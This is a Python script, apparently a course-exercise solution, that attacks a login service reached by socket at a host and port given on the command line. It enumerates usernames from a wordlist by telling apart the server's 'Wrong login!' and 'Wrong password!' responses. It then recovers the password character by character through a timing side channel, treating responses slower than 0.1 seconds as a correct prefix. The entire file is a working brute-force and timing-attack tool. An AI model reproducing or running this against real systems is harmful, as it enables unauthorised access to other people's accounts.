import socket
import string
import itertools
import sys
import json
import os
from datetime import datetime


def read_logins():
    with open('logins.txt', 'r', encoding='utf-8') as file:
        yield from file.read().splitlines()


def hack_login():
	for login in read_logins():
		post = {
				"login" : login,
				"password" : ''
				}
		post_to_json = json.dumps(post)
		client_socket.send(post_to_json.encode())
		response = client_socket.recv(1024).decode()
		answer = json.loads(response)['result']
	
		if answer == 'Wrong login!':
			continue
		elif answer == 'Wrong password!':
			return login


def gen_passwords(combinations):
	yield from itertools.product(*combinations)

def hack_password(login):
	characters = string.ascii_letters + string.digits
	letter = ''
	while True:
		combinations = [(letter,), characters]
		start = datetime.now()
		for password in gen_passwords(combinations):
			password = ''.join(password)
			post = {
					"login" : login,
					"password" : password
					}
			post_to_json = json.dumps(post, indent=4)
			client_socket.send(post_to_json.encode())
			response = client_socket.recv(1024).decode()
			answer = json.loads(response)['result']
		
			if answer == 'Wrong password!':
				end = datetime.now()
				delta = end - start
				
				seconds = delta.total_seconds()
				# print(seconds)
				if seconds >= 0.1:
					# print(password)
					letter = password
					break
				else:
					continue	
			elif answer == 'Connection success!':
				print(post_to_json)
				return password		


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
	host = sys.argv[1]
	port = int(sys.argv[2])
	address = (host, port)
	client_socket.connect(address)

	login = hack_login()
	password = hack_password(login)
	

